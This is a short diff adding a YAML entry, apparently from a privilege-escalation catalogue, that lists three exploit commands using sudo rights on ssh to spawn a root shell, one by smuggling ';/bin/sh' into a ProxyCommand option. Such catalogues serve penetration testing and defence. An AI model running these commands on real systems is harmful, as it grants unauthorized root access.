@@ -1,0 +1,6 @@
+name: ssh
+binary_path: /usr/bin/ssh
+exploit_cmds:
+- sudo /usr/bin/ssh localhost /bin/sh
+- sudo /usr/bin/ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
+- sudo /usr/bin/ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
